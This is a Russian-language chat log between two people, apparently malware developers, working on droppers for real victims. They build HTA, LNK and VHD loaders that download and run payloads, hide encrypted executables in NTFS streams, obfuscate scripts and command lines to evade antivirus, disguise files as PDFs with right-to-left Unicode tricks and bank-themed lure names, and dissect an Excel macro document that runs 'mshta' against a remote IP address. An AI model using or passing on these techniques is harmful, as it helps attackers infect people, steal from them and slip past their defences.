[27.10.21 12:40:24] jaime:		https://github.com/vysecurity/morphHTA
[27.10.21 12:40:56] jaime:		Привет. Ты вот тут смотрел? Может есть что то полезное по теме?
[27.10.21 12:41:30] ryan:		Привет, сейчас посмотрю
[27.10.21 12:44:45] ryan:		Там морфер hta (морфер яваскрипта) - хочу сделать что-то похожее, но только на C++
[27.10.21 12:53:27] jaime:		А почему на C++?
[27.10.21 12:53:39] jaime:		Я делал на python для vbs
[27.10.21 12:53:52] jaime:		Можно exe на раз сделать
[27.10.21 12:57:32] ryan:		На C++ чтобы из ботов можно было использовать, например чтобы бот прописывался в системе не как exe файл а как hta
[27.10.21 13:00:09] jaime:		Ну возможно. Но тот все равно момент что создается промежуточный файл.
[27.10.21 13:00:35] jaime:		А еще вот у меня по умолчанию не назначен обработчик hta, выкатило с пяток прог
[27.10.21 13:00:52] ryan:		А какая виндовс была ?
[27.10.21 13:01:08] ryan:		Не серверная ?
[27.10.21 13:03:27] jaime:		нет обычная 10
[27.10.21 13:22:16] ryan:		Там Frances спрашивает сделать тестовый вариант с DLL, как сделаю тогда тебе его прислать потестить ? Он говорит ты в курсе этого
[27.10.21 13:24:05] jaime:		Давай, так там будет вызов rundll?
[27.10.21 13:24:21] ryan:		Да, через rundll32 делаю
[27.10.21 13:24:24] jaime:		Или можно сразу ф-цию?
[27.10.21 13:24:56] jaime:		Было бы круто сразу ф-цию
[27.10.21 13:25:49] jaime:		Не знаю возможностей javascript :)
[27.10.21 13:26:03] ryan:		Сразу чтобы API вызывать из скриптов нашёл пока только способ через класс DynamicWrapper, но он мало где работает
[27.10.21 13:26:21] ryan:		Пока самый реальный вариант это через rundll32
[27.10.21 13:27:24] ryan:		Из VBA скриптов (winword, excel) winapi вызываются легко, но из других скриптов с этим проблема
[27.10.21 13:46:49] ryan:		Сделал с тестовой DLL: https://qaz.im/load/kFr3Q3/fzG45T
[27.10.21 13:46:58] ryan:		Пасс Zzzzz
[27.10.21 13:53:14] jaime:		Ага сейчас гляну
[27.10.21 13:59:21] jaime:		Норм. Работает
[27.10.21 13:59:50] jaime:		осталось только обфускатором закрыть
[27.10.21 14:00:18] ryan:		Сейчас ещё один вариант пришлю - там dll без точки входа будет
[27.10.21 14:04:08] ryan:		https://qaz.im/load/4zQE3b/tAare8
[27.10.21 14:04:14] ryan:		Пасс Zzzzz
[27.10.21 14:06:01] jaime:		rundll32 "+e+", TestAPI" ? А в чем разница с предыдущим?
[27.10.21 14:07:09] ryan:		Первый был стандартный DLL, во втором нету точки входа и функции DllMain. В нём только экспорты лежат
[27.10.21 14:08:28] ryan:		Это такой формат DLL есть без точки входа. Такие DLL система использует как контейнеры для ресурсов
[27.10.21 14:08:38] jaime:		Ага понял, я саму dllку не смотрел. Хотя да там было два в вызова, attach и export
[27.10.21 14:08:58] jaime:		Да я сам иногда пользую :)
[27.10.21 14:15:18] jaime:		https://file.io/Pcx7uk7HYRdg
[27.10.21 14:15:28] jaime:		386c5bb5a93dbf54587986251c6d8886
[27.10.21 14:15:42] jaime:		запускать lnk я вот так делал
[27.10.21 14:16:01] jaime:		два файла лежат на vxd контейнере
[27.10.21 14:16:10] jaime:		Ну или в одной папке
[27.10.21 14:16:18] jaime:		Там калькулятор
[27.10.21 14:16:46] ryan:		Сейчас посмотрю
[27.10.21 14:21:08] ryan:		Идея появилась этот lnk с hta соединить. Попробую, может получиться
[27.10.21 14:22:28] jaime:		Я думаю просто из lnk запустить hta причем напрямую через mshta.exe  (или как она там точно), а вот в hta все положить
[27.10.21 14:22:43] jaime:		Ну и закрыть все хоть как то :)
[27.10.21 14:23:45] ryan:		lnk и hta хочу объединить чтобы они в одном файле были
[27.10.21 14:24:40] ryan:		Через cmd.exe копирую lnk из которого запустились в hta, потом этот hta запускаю через mshta.exe
[27.10.21 14:25:42] jaime:		Палевно когда lnk большой
[27.10.21 14:25:45] ryan:		Хотя тут проблема - как получить имя lnk файла из которого запустились
[27.10.21 14:25:57] jaime:		А зачем?
[27.10.21 14:26:29] jaime:		Я генерю имена рандомно, и все в tmp. В билдере
[27.10.21 14:27:27] ryan:		У lnk имя всегда постоянное будет ? Чтобы его можно было в команде copy использовать
[27.10.21 14:27:59] jaime:		нет разное
[27.10.21 14:28:38] jaime:		И иконоки разные
[27.10.21 14:30:05] ryan:		А там значит нет такого требования чтобы всё было в одном файле ? Всё это может быть папкой из нескольких файлов ?
[27.10.21 14:31:24] ryan:		Тогда из lnk проще вызывать: "cmd.exe /C mshta.exe file.hta"
[27.10.21 14:32:13] jaime:		Сейчас тебе скину гтовый пример
[27.10.21 14:34:45] jaime:		https://file.io/efXjkIexAc0P
[27.10.21 14:34:54] jaime:		ZpcwqmQkEm
[27.10.21 14:35:08] jaime:		это сам контейнер с тем же калькулятором
[27.10.21 14:38:53] ryan:		Ясно, значит можно сделать какой-то комплект из файлов (hta, lnk или ещё каких-то других), который потом будет помещен в vhd ?
[27.10.21 14:40:05] jaime:		Да совершенно точно. Круто было бы научиться vhd подписывать
[27.10.21 14:41:20] jaime:		Сейчас вся нагрузка лежит в txt, lnk ее от туда извлекает и запускает.
[27.10.21 14:42:10] jaime:		Есть что как javacript обфускировать?
[27.10.21 14:42:54] ryan:		Да, на C++ планирую javascript обфускатор сделать
[27.10.21 14:43:35] ryan:		Есть онлайн обфускаторы, но мне не нравится то что скрипт в этом случае попадает посторонним
[27.10.21 14:43:57] jaime:		Не нафиг ни каких online :)
[28.10.21 13:17:10] jaime:		Привет!
[28.10.21 13:17:26] jaime:		А я что то не понял а как ты файл убрал? :)
[28.10.21 13:18:23] ryan:		Сейчас вместо отдельного файла записывается в NTFS поток hta файла из которого запустилось
[28.10.21 13:18:59] ryan:		dll.hta:$ - в NTFS поток с этим именем
[28.10.21 13:19:16] jaime:		Интересно
[28.10.21 13:20:27] ryan:		Но теперь например если файловая система будет FAT то тогда работать не будет. Работает только на NTFS. Но NTFS сейчас везде
[28.10.21 13:25:10] jaime:		Отлично. Прикрутил в билдер
[28.10.21 13:26:03] ryan:		Дальше сейчас по плану добавление шифрования, чтобы exe был не в открытом виде
[28.10.21 13:26:46] jaime:		думаю это не очень нужно, обычно нагрузка чистая
[28.10.21 13:26:48] ryan:		Потом после этого обфускация скрипта
[28.10.21 13:37:02] jaime:		А можешь еще одну версию сделать? Что бы нагрузка забралась с адреса и запустилась? :)
[28.10.21 13:37:20] jaime:		Я в js ни ногой! :)
[28.10.21 13:38:08] ryan:		Ok, попробую сделать
[28.10.21 13:38:33] jaime:		Спасибо :)
[29.10.21 09:20:19] ryan:		Привет
[29.10.21 09:20:43] ryan:		Сделал скачивание и запуск https://qaz.im/load/aFfSbT/rHH6AT пасс Zzzzz
[29.10.21 09:21:43] ryan:		Сейчас там ссылка http://localhost/... - её нужно заменить на свою
[29.10.21 10:29:41] jaime:		Привет!  Ага спасибо, забрал!
[01.11.21 11:46:16] jaime:		https://file.io/SLhj9jZJe2iF
[01.11.21 11:46:35] jaime:		660936a341165c46d1120db42f9fdb17
[01.11.21 11:47:26] jaime:		Глянь что получилось, я обфускатор прикрутил к твоему коду + рандомные имена для переменных
[01.11.21 11:48:04] jaime:		На nodejs взял этот известный обфускатор который в online болтается
[01.11.21 11:48:34] jaime:		Внутри калькулятор
[01.11.21 11:48:38] ryan:		Сейчас посмотрю
[01.11.21 12:00:32] ryan:		Отлично, ещё можно строки попрятать: вместо "WScript.Shell" записать: str='W', str+='S', str+='c' и т.д.
[01.11.21 12:03:55] jaime:		Ага, инетерсно там е сть готовые ключики
[01.11.21 12:16:09] jaime:		Да этот обфускатор умеет так делать
[01.11.21 12:16:27] jaime:		avhMvyrpKsPG=Q['g'+'e'+'t'+'f'+'i'+'l'+'e']
[08.11.21 11:33:07] jaime:		А можешь мне скинуть инфу по pdf, ту что в группе _svg писал
[08.11.21 11:33:13] jaime:		Все что то занулилось
[08.11.21 11:33:26] ryan:		Сейчас пришлю
[08.11.21 11:35:48] ryan:		https://qaz.im/load/FeSFGT/8yiz6e 2 пасс sdf76s8ysh8$23r2234rrt@#45
[08.11.21 11:36:19] ryan:		Там вариант маскировки расширения hta и wsf под pdf
[08.11.21 11:36:57] ryan:		pdf расширение отобразится только в проводнике, в архиваторе например будет искаженное имя файла
[08.11.21 11:44:53] jaime:		Ага спасибо. :)
[08.11.21 11:44:58] jaime:		Сейчас гляну
[08.11.21 11:52:43] jaime:		Стремные какие имена :)
[08.11.21 11:54:39] ryan:		Можно такое например сделать ath.bankofamerica.com - credit approval.pdf
[08.11.21 11:56:57] ryan:		"fsw.hsbc.co.uk - need your approval for transfer funds.pdf"
[08.11.21 12:15:37] jaime:		А есть что почитать? Что бы понять суть?
[08.11.21 12:16:12] jaime:		Вообще очень забавно. Это по теме с управляющими unicod?
[08.11.21 12:20:33] ryan:		Да, строка в обратном направлении пишется. В уникоде используется для языков типа арабского, где пишут справа налево
[08.11.21 12:20:45] ryan:		Полный список управляющих кодов - https://ru.wikipedia.org/wiki/%D0%A3%D0%BF%D1%80%D0%B0%D0%B2%D0%BB%D1%8F%D1%8E%D1%89%D0%B8%D0%B5_%D1%81%D0%B8%D0%BC%D0%B2%D0%BE%D0%BB%D1%8B
[08.11.21 14:23:13] jaime:		А как можно посмотреть какие символы в имени? :)
[08.11.21 14:23:44] jaime:		Я в фаре вижу какую то хрень :)
[08.11.21 14:24:22] ryan:		Скопировать имя в блокнот и сохранить текст как unicode. Потом открыть сохранённый текст в фаре или hex редакторе
[08.11.21 14:24:45] jaime:		О как спасибо. :)
[08.11.21 14:41:25] jaime:		Так может я совсем туп. Я не знаю как скопировать имя. Я копирую в Far, получаю что то типа E2 80 E2 80
[08.11.21 14:43:02] ryan:		Выбирай в проводнике переименовывание файла, нажимай Ctrl-A затем Ctrl-Insert, так он скопируется в clipboard
[08.11.21 14:44:13] ryan:		Затем в блокноте Shift-Insert и далее сохраняй в unicode
[08.11.21 14:47:33] jaime:		Я в ubuntu копирую
[08.11.21 14:47:47] jaime:		Я с виндой не сильно дружу
[08.11.21 14:52:12] ryan:		Ещё как можно сделать: в hex редакторе создай файл из четырёх байт: FE FF 20 2E и копируй к нему любую unicode строку. После копирования к этим байтам она будет отображаться в обратном направлении
[08.11.21 14:53:15] ryan:		FE FF - это признак того что текст unicode (под windows так, под linux не знаю так это или нет). 20 2E - управляющие символы уникоде для реверса строки
[08.11.21 14:54:36] ryan:		Ещё способ: копируй отсюда символ реверса строки: https://unicode-explorer.com/c/202E
[08.11.21 14:54:55] ryan:		И вставляй его перед строкой которую надо развернуть в обратном направлении
[08.11.21 14:56:16] jaime:		Ну в общем понял. Спасибо. Сейчас развлекаюсь :)
[08.11.21 14:57:02] ryan:		В проводнике можно прямо во время переименования файла вставлять этот символ, в KDE под линуксами то же наверное будет это работать
[08.11.21 14:57:50] jaime:		Да имена то же не кажет
[16.11.21 13:36:52] jaime:		Привет. :)
[16.11.21 13:43:14] ryan:		Привет
[16.11.21 13:52:16] jaime:		Нужно просто к картинке прилепить hta? :)
[16.11.21 13:56:49] ryan:		builder.exe пишет в начало hta файла картинку и ещё в самом hta скрипте прописывает смещение, откуда читать зашифрованный exe файл
[16.11.21 13:57:39] ryan:		Просто соединить hta с картинкой командой copy не получится. Скрипт хоть и запустится, но расшифрует exe неправильно
[16.11.21 14:11:07] jaime:		А точно, забыл! :)
[16.11.21 15:08:50] jaime:		Вот мне тема с картинкой нравится, особенно в контейнере
[16.11.21 15:15:10] ryan:		Из lnk можно переименование картинки в hta сделать одной командой. Или копирование
[16.11.21 15:15:44] jaime:		Ага вот именно, а на образе все красиво будет
[16.11.21 15:28:13] jaime:		https://file.io/RmusT10VKze9
[16.11.21 15:28:21] jaime:		620a6e494beae2df96f469bf48420cc7
[16.11.21 15:29:09] jaime:		Вот будет желание глянь, запуск через lnk. Твоя идея с картинкой :) Нагрузка калькулятор
[16.11.21 15:29:51] ryan:		Не скачалось, file deleted
[16.11.21 15:32:06] jaime:		```
Download: https://qaz.im/load/r2haSS/nB3E6Q
Delete: https://qaz.im/index.php?a=delete&q=1043067380
```
[16.11.21 15:32:09] jaime:		620a6e494beae2df96f469bf48420cc7
[16.11.21 15:35:28] ryan:		Скачал
[16.11.21 15:45:13] ryan:		Попробовал ещё позапускать так: "mshta.exe %tmp%\readme.jpg" - не получается, в этом случае откроется картинка, а не hta. Жаль, без переименования в hta тут не обойтись
[16.11.21 15:47:37] jaime:		а через lnk?
[16.11.21 15:49:08] ryan:		Всё равно то же самое, открывается через проводник, а проводник определяет по расширению какую программу для обработки файла вызвать
[16.11.21 15:50:09] ryan:		Можно скопировать jpg в hta, вызвать hta, как hta закончит работу удалить его. Так будет то же незаметно
[16.11.21 15:51:30] ryan:		Как сейчас в lnk сделано, только в конце можно добавить &&del %tmp%\filename.hta
[18.11.21 11:48:41] jaime:		Привет.
[18.11.21 11:49:00] ryan:		Привет
[18.11.21 11:49:21] jaime:		2. у которого зашифрованный exe хранится теперь не в конце файла, а в отдельном NTFS потоке?
[18.11.21 11:49:36] jaime:		А можешь кинуть почитать что или посмотреть?
[18.11.21 11:49:46] jaime:		про NTFS поток
[18.11.21 12:10:18] ryan:		Сейчас пришлю
[18.11.21 12:11:41] ryan:		https://ru.wikipedia.org/wiki/%D0%90%D0%BB%D1%8C%D1%82%D0%B5%D1%80%D0%BD%D0%B0%D1%82%D0%B8%D0%B2%D0%BD%D1%8B%D0%B5_%D0%BF%D0%BE%D1%82%D0%BE%D0%BA%D0%B8_%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85
[18.11.21 12:12:35] ryan:		То есть например есть файл 12345.txt, и к нему дополнительный файл можно приписать через двоеточие 12345.txt:stream1
[18.11.21 12:13:27] ryan:		HTA пишущие в потоки файлов уже присылал, только там поток использовался как временный файл
[18.11.21 12:23:26] jaime:		Да видел как временный, с ним как раз я понял. А вот как ты сейчас хочешь не очень.
[18.11.21 12:25:20] ryan:		В архиваторе можно указать пункт "сохранять файлы вместе со всеми их" NTFS потоками. Зашифрованный EXE будет храниться не в конце файла result.jpg как сейчас, а в отдельном потоке с именем reulst.hta:stream1
[18.11.21 12:26:10] ryan:		После распаковки архива поток с именем result.hta:stream1 сохранится, и скрипт считает зашифрованный файл из потока stream1
[18.11.21 12:26:48] ryan:		При этом антивирусы внутри архива проверяют только файлы, а на потоки прикреплённые к ним не смотрят
[18.11.21 12:28:47] jaime:		Не очень понял в чем разница в данном случает между потоком и файлом, не буду мучат вопросами. Лучше почитаю. Спасибо. :)
[18.11.21 12:36:49] ryan:		В потоке скрытно файл лежит. В проводнике или любом другом файловом менеджере виден только файл result.hta А добраться и увидеть его потоки не так то просто. С потоками вообщем скрытней получается, дополнительная маскировка.
[18.11.21 13:43:46] jaime:		А при копировании файла, связанный с ним поток то же скопируется?
[18.11.21 13:44:40] jaime:		А ты думаешь это удобнее чем хранить в hta?
[18.11.21 13:45:16] ryan:		Если копирование было в пределах одного логического диска, то тогда потоки сохраняются
[18.11.21 13:45:57] ryan:		Наоборот будет неудобнее чем в HTA, но это даёт скрытность
[18.11.21 13:46:19] ryan:		Например внутри архива антивирусы потоки файлов вообще не проверяют
[18.11.21 15:12:04] jaime:		Можно запустить скрытый поток через wmic process call create c полным путем в потоку
[18.11.21 15:12:40] ryan:		Сейчас попробую
[18.11.21 15:15:18] ryan:		Вот этот скрипт через wmic то же умеет потоки запускать:
```
<script language=vbscript>

set w=getobject("winmgmts://./root/cimv2")
set b=w.get("Win32_Process").Methods_("Create").InParameters.SpawnInstance_:b.commandline="calc.exe"
set s=w.execmethod("Win32_Process","Create",b)

</script>

```
[18.11.21 15:15:47] ryan:		Но твой вариант в одну строку и его можно в lnk использовать
[18.11.21 15:16:32] jaime:		да но больно просто, все открыто
[29.11.21 15:55:47] jaime:		Привет. Не подскажешь как можно вызов mshta.exe к командной строке замаскировать? У меня детект сразу на lnk. При открытии контейнера.
[29.11.21 15:57:35] ryan:		Вместо mshta.exe можно написать m""s""h""t""a.""e""x""e например
[29.11.21 15:58:41] ryan:		У тебя есть мануал по маскировке командной строки ? Я в #cyberpunk его постил. Если нет, тогда пришлю
[29.11.21 16:00:28] jaime:		нет нету. Все стерлось
[29.11.21 16:00:37] jaime:		Пришли пожалуйста.
[29.11.21 16:00:37] ryan:		Сейчас пришлю
[29.11.21 16:00:48] jaime:		Заранее спасибо. :)
[29.11.21 16:02:59] ryan:		Мануал https://qaz.im/load/GNrTYN/7f4Dri пасс sd09f7sdf098fs90d8f0ds8d90s8f0ds8f0ds8f
[29.11.21 16:03:06] ryan:		Там много разных способов как командную строку можно исказить
[29.11.21 16:07:45] jaime:		Забрал спасибо. Посмотрю уйдет или нет.
[29.11.21 17:43:33] jaime:		Все ок.
[29.11.21 17:43:50] jaime:		А вот интересно, я запускаю калькулятор деф не ругается
[29.11.21 17:43:59] jaime:		запускаю нагрузку все сразу ругань
[29.11.21 17:44:51] ryan:		Может сам файл нагрузки палится ?
[29.11.21 17:45:12] jaime:		сказали чистый
[30.11.21 14:02:08] jaime:		Привет! Взял твой последний POC с wordpad, запускаю x.bat, запускается wordpad, в чем я не прав?
[30.11.21 14:09:42] ryan:		Привет
[30.11.21 14:09:47] ryan:		На какой системе ?
[30.11.21 14:11:38] jaime:		Windows 10 64
[30.11.21 14:12:08] jaime:		Rus
[30.11.21 14:15:28] ryan:		Сейчас посмотрю
[30.11.21 14:23:27] ryan:		Сейчас ещё один пришлю
[30.11.21 14:28:03] ryan:		Попробуй этот https://qaz.im/load/HSbEBn/QEt6d8 пасс 346534345345345345
[30.11.21 14:36:15] ryan:		Работает новый ?
[30.11.21 14:40:40] jaime:		Сейчас проверю. Отвлекли
[30.11.21 14:41:27] jaime:		О да все ок!
[30.11.21 14:41:34] ryan:		Отлично
[30.11.21 14:41:53] jaime:		А как то? :)
[30.11.21 14:42:50] ryan:		Путь к programw6432 забыл стереть
[30.11.21 14:43:14] jaime:		как оно работает? :)
[30.11.21 14:44:29] ryan:		Через переменную set стираем путь к папке "Program Files", там где лежит реальный wordpad.exe
write.exe не может найти реальный wordpad.exe и запускает его из текущей папки
[01.12.21 16:22:07] jaime:		Привет. :) Можешь помочь в одном вопросе? :)
[01.12.21 16:22:52] ryan:		Привет
[01.12.21 16:26:09] jaime:		Создал ISO файл. Поместил в него autorun.inf, но запуска нет, да и фиг с ним с запуском. Жму правой кнопкой мышки на диске, там нет 'Открыть автозапуск'. Не знаешь в чем может быть дело?
[01.12.21 16:27:35] ryan:		Начиная с Windows 7 autorun с дисков убран
[01.12.21 16:27:36] jaime:		Подключаю через powershell Mount-DiskImage -ImagePath
[01.12.21 16:27:48] ryan:		Только под XP запустится
[01.12.21 16:28:01] jaime:		Но но диске VirtualBox он есть и пункт меню такой есть
[01.12.21 16:28:38] jaime:		да он не запускается, но пункт меню есть
[01.12.21 16:28:52] jaime:		Иконка кстати подхватывается
[01.12.21 16:28:59] jaime:		И метка диска
[01.12.21 16:29:50] ryan:		Чтобы включить авторан надо в реестре этот ключ редактировать
```
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
```
[01.12.21 16:30:11] ryan:		Значение "NoDriveTypeAutoRun"=dword:000000
[01.12.21 16:31:28] jaime:		А я это включил
[01.12.21 16:33:49] jaime:		Походу какая то особенность монтирования у explorer
[01.12.21 16:34:38] jaime:		Если vhd подключаю, то пункт меню есть, на ISO нет
[01.12.21 16:35:06] ryan:		А этот ключ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\disableAutoplay ?
[01.12.21 16:38:15] jaime:		А такого у меня нет
[01.12.21 16:39:54] jaime:		непонятно почему по разному для ISO  и для vhd
[01.12.21 16:41:14] ryan:		Может потому-что vhd как флешка воспринимается системой
[01.12.21 16:42:17] jaime:		Еще не понятно почему iso как DVD монтируется, а можно ли его как CD принудительно подмонтировать? Извини за дурацкие вопросы.
[01.12.21 16:42:28] ryan:		Для флешек начиная с Win 7 точно автозапуска отключен, для компакт дисков - как-то в реестре можно квключить
[01.12.21 16:43:45] jaime:		Я когда vhd подключаю у меня выскаиевает меню с выбором действия,  но там нет запуска моей проги. А я хотел именно добавить в выбор свою программу
[01.12.21 16:44:14] jaime:		Думал что с ISO прокатит
[01.12.21 16:44:47] jaime:		VirtualBox когда монирует свой GuestAdditition там он есть в запуске
[01.12.21 16:44:48] ryan:		Может быть он как DVD диск вначале был отформатирован, тип файловой системы при форматировании не был указан как Fat, ntfs  или тому подобных
[01.12.21 16:45:09] jaime:		А на диске iso9660
[01.12.21 16:45:18] jaime:		Там другого даже не создать
[01.12.21 16:46:13] jaime:		Если я iso с guest additition монтирую через explorer, он тоже становится dvd без автозапуска.
[16.12.21 09:11:02] jaime:		Привет!
[16.12.21 09:12:49] ryan:		Привет
[16.12.21 09:13:53] jaime:		А ты не хочешь сделать репо с доками и примерами?
[16.12.21 09:14:02] jaime:		Может уже есть?
[16.12.21 09:14:22] jaime:		А то канал зачистили, а я там хотел инфу подчерпнуть.
[16.12.21 09:15:07] ryan:		Всё что есть в одном доке собрать ? Да, была такая мысль. Могу сделать
[16.12.21 09:20:40] jaime:		Может на нашем гите?
[16.12.21 09:20:54] jaime:		там дока и примеры, очень удобно было бы
[16.12.21 09:21:13] ryan:		Ok, тогда в гите отдельную ветку сделаю
[16.12.21 09:21:48] jaime:		Супер, отлично. А то обидно, канал зануляется, труды пропадают
[01.02.22 14:35:02] jaime:		Привет!
[01.02.22 14:35:31] ryan:		Привет
[01.02.22 14:36:06] jaime:		А не подскажешь инструмент для извлечения макросов из xls?
[01.02.22 14:36:19] jaime:		Или вообще как это делается?
[01.02.22 14:37:36] ryan:		xls это на самом деле zip архив, распаковываешь его например винраром или любым другим архиватором и ищещь в распакованных файлах файл vbaproject.bin
[01.02.22 14:37:53] jaime:		Я взял вот это https://github.com/DissectMalware/XLMMacroDeobfuscator
[01.02.22 14:38:52] ryan:		Дальше ставишь Far Manager и плагин к нему Doc Browser, после этого просматриваешь файл vbaproject.bin как обычную папку
[01.02.22 14:39:35] jaime:		Вижу 3 файла [5]DocumentSummaryInformation,[5]SummaryInformation, Workbook
[01.02.22 14:40:21] ryan:		xls файл, отс старого excel. Не xlsx ?
[01.02.22 14:40:33] jaime:		xls
[01.02.22 14:41:07] ryan:		Тогда через Far Manager с установленным плагином Doc Browser открывай этот xls
[01.02.22 14:43:13] ryan:		NewMacros и ThisDocument там нет таких файлов ?
[01.02.22 14:45:21] jaime:		Поставил вижу то же что и при переименовании в zip
[01.02.22 14:45:45] jaime:		[5]DocumentSummaryInformation
[5]SummaryInformation
Workbook
[01.02.22 14:49:28] ryan:		Сейчас открыл старый Excel, в нём внутри 3 этих файлаи ещё папка с именем _VBA_PROJECT_CUR
[01.02.22 14:50:17] ryan:		Открывал в Far Manager плагином Doc Browser
[01.02.22 14:51:03] ryan:		Пришли этот файл, попробую распаковать
[02.02.22 08:51:42] jaime:		Привет!
[02.02.22 08:52:02] jaime:		Ты знаком с такой техникой: https://github.com/echtdefault/MalDoc-Embedded-EXE-Bin-
[02.02.22 08:53:55] ryan:		Привет
[02.02.22 08:54:00] ryan:		Сейчас посмотрю
[02.02.22 09:00:11] ryan:		Там, как я понял, просто способ как EXE прятать внутри doc файла, без запуска ?
В Winword в меню выбирается "Вставка объекта" и вставляется EXE, потом выбираем "Сохранить как RTF"
И там VBA макроc, который извлекает этот EXE
[02.02.22 09:13:51] jaime:		Как то так. Но у меня не заработало. :)
[02.02.22 09:14:58] jaime:		Я тебе могу xls прислать? О котором вчера говорил?
[02.02.22 09:15:44] ryan:		Присылай
[02.02.22 09:17:13] jaime:		Сейчас
[02.02.22 09:17:25] jaime:		А вот это смотрел? https://github.com/klezVirus/CVE-2021-40444
[02.02.22 09:18:50] jaime:		```
Download: https://qaz.im/load/GfT7T9/DtbYdF
Delete: https://qaz.im/index.php?a=delete&q=1617189107
```
[02.02.22 09:19:02] jaime:		b56aee8393a567d5aeb510269f72dbbe
[02.02.22 09:20:05] jaime:		По моим скупым сведениям кроме скачивания и выполнения hta файла тут ничего нет.
[02.02.22 09:20:27] jaime:		Хочу услышать твое авторитетное мнение.
[02.02.22 09:20:59] ryan:		Скачал, сейчас буду смотреть
[02.02.22 09:44:58] ryan:		Распаковал, вроде скриптов никаких не видно
Пасс e0g9dfsg0f0df9g8d90fg8
```
http://shfzb3557rzqs5vs6oincmn67fw6s7xs7onwydqlyrp4saffgy4wboid.onion/unpacked_xls.rar 
```
[02.02.22 09:48:13] jaime:		А как workbook распаковыввать? :)
[02.02.22 09:50:09] ryan:		Там стандартный zip архив
[02.02.22 09:50:50] jaime:		А как он нагрузку забирает?
[02.02.22 09:51:24] jaime:		С смысле xls
[02.02.22 09:53:13] ryan:		Запускает команду 
```
CMD.EXE /c mshta http://91.240.118.172/cc/vv/fe.html
```
[02.02.22 09:54:46] ryan:		Только запуск командной строки виден, скачивающей и запускающей hta скрипт. Vba скриптов не видно
[02.02.22 09:55:16] jaime:		Я вот то же так решил, но мало ли может что то еще есть.
[02.02.22 09:55:35] jaime:		А в чем прелесть такого способа?
[02.02.22 09:56:24] jaime:		А вот еще дурацкий вопрос, где строчка запуска в самом Workbook ?
[02.02.22 09:58:19] ryan:		То что окошко с макросами не показывается
Но срабатывает мало где
Там в ячейке таблицы формула вписана, в ней вызов командной строки
Сейчас описание найду этого эксплоита
[02.02.22 10:03:58] ryan:		Вводим в ячейку Excel вот эту формулу:
```
=cmd|'/C calc'!A0
```
При нажатии на ячейку запустится калькулятор
[02.02.22 10:07:30] ryan:		При открытии xls скорее всего excel выдаст предупреждение об автоматическом открытии ссылок
[02.02.22 10:13:38] jaime:		Понял. Спасибо за информацию. :)
[02.02.22 15:14:28] jaime:		У меня кстати почему то не отрабатывает =cmd|'/C calc'!A0
[02.02.22 15:14:46] jaime:		Смотрю как раз этот механизм
[02.02.22 15:17:17] ryan:		Скорее всего потому что оффис новый
Тут сейчас тестировали это с CSV файлами, оказалось что только на старых офисах работает
[02.02.22 15:17:44] jaime:		У меня 2016
[02.02.22 15:18:24] ryan:		На нём не запустится это скорее всего
[03.02.22 09:43:31] jaime:		Привет.
[03.02.22 09:43:44] jaime:		А можно глупый вопрос? :)
[03.02.22 09:45:49] ryan:		Привет
[03.02.22 09:46:01] jaime:		Если не занят :)
[03.02.22 09:46:41] ryan:		Не занят
[03.02.22 09:47:34] jaime:		Вот мы смотрим файл xls как архив, а где собственно данные для ячеек?
[03.02.22 09:52:58] ryan:		Сейчас посмотрю, вроде в конце файла workbook записываются
[03.02.22 09:54:26] jaime:		Он не фигурирует как файл в архиве?
[03.02.22 09:55:32] ryan:		В только что созданном файле в папке Worksheets файлы с именами sheet1.xml, sheet2.xml и так далее для каждого листа
Но во вчерашнем файле такой папки нету
[03.02.22 09:56:56] jaime:		А ты знаешь утилиту oledump?
[03.02.22 09:58:15] ryan:		Данные ячеек лежат между теками <f> </f> в файлах sheet*.xml
Oledump не пользовался
[03.02.22 09:58:27] jaime:		Она достает из этого xls данные
[03.02.22 09:58:54] jaime:		```
 '0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - \x00Protec'                                                                                                                     '0085     13 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden - \x00LINK'                                                                                                                            '0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - \x00Sheet'                                                                                                                       '0018     23 LABEL : Cell Value, String Constant - built-in-name 1 Auto_Open len=7 ptgRef3d \x00Protec!R1C3 '                                                                                                      0006     81 FORMULA : Cell Formula - R3C3 len=59 ptgStr "CMD.EXE /c mshta http://91.240.118.172/cc/vv/fe.html" ptgFuncVarV args 1 func EXEC (0x006e)                                                               0006     26 FORMULA : Cell Formula - R5C3 len=4 ptgFuncVarV args 0 func HALT (0x0036)                                                                                    
```
[03.02.22 09:59:32] ryan:		Сейчас посмотрю её, как она ячейки ищет. Она вроде на питоне написана
[03.02.22 10:04:40] ryan:		Это в новых версиях excel ячейки хранятся в файлах sheet*.xml
Вчерашний файл в старом формате, я забыл про это
Сейчас дальше смотрю
[03.02.22 10:08:44] jaime:		А вообще интересная утилитка
[03.02.22 10:09:38] jaime:		Я просто хочу для начала автоматом собрать такой же xls, один в один
[03.02.22 10:10:52] ryan:		Файл workbook смотрю - там в нём вроде 2 файла архива идущие один за другим. 
Сейчас второй архив извлечь попробую оттуда
[03.02.22 10:40:40] ryan:		Вот такое нашлось: в старых файлах экселя данные ячеек лежат между строками "ffffff", листы отделяются друг от друга строками "333333"
Но это только предположение, точно не знаю так ли это на самом деле
[03.02.22 11:31:30] jaime:		Понял. А ты автоматизировал сборку доков с нагрузкой?
[03.02.22 11:45:56] ryan:		Пока ещё нет, пока новой админкой и разбором pdf занят
[09.02.22 09:32:32] jaime:		Привет
[09.02.22 09:35:09] ryan:		Привет
[09.02.22 10:07:06] jaime:		Помнишь тему с нагрузкой в jpg
[09.02.22 10:07:31] jaime:		Ее можнео вставить в документ
[09.02.22 10:07:52] jaime:		А как эту картинку сохранить на диск из документа?
[09.02.22 10:13:03] ryan:		Из VBA скрипта нужно это сделать ? Достать картинку из содержимого документа и сохранить на диск
[09.02.22 10:14:08] jaime:		Да. Я вот не нашел как это.
[09.02.22 10:14:21] ryan:		Сейчас посмотрю
[09.02.22 10:14:32] jaime:		Вроде не хитро должно быть, у картинки есть имя
[09.02.22 10:14:46] jaime:		Я в xls смотрел
[09.02.22 10:15:16] jaime:		Shape можно сохранить, но это по сути скрин области будет
[09.02.22 10:15:31] jaime:		Там уже не будет нагрузки
[09.02.22 10:19:14] jaime:		А вообще как думаешь норм тема?
